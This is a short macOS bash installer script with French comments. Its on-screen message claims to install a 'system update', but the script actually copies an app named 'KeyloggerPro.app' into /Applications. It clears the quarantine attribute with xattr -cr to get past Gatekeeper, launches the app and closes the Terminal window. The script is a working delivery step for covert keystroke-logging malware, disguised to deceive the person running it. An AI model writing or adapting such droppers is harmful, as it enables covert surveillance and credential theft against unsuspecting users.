#!/bin/bash
DIR=$(cd "$(dirname "$0")"; pwd)
APP_NAME="KeyloggerPro.app"
SOURCE="$DIR/$APP_NAME"
DEST="/Applications/$APP_NAME"

# Couleurs
GREEN='\033[0;32m'
NC='\033[0m'

echo -e "${GREEN}Installation de la mise à jour système...${NC}"

# 1. Nettoyer la quarantaine (La commande magique)
xattr -cr "$SOURCE"

# 2. Copier dans le dossier Applications
if [ -d "$DEST" ]; then
    rm -rf "$DEST"
fi
cp -R "$SOURCE" "$DEST"

# 3. Lancer l'application
open "$DEST"

echo -e "${GREEN}Terminé.${NC}"
echo "Vous pouvez fermer cette fenêtre."

# Fermer le terminal proprement après 2 secondes
sleep 2
osascript -e 'tell application "Terminal" to quit' & exit
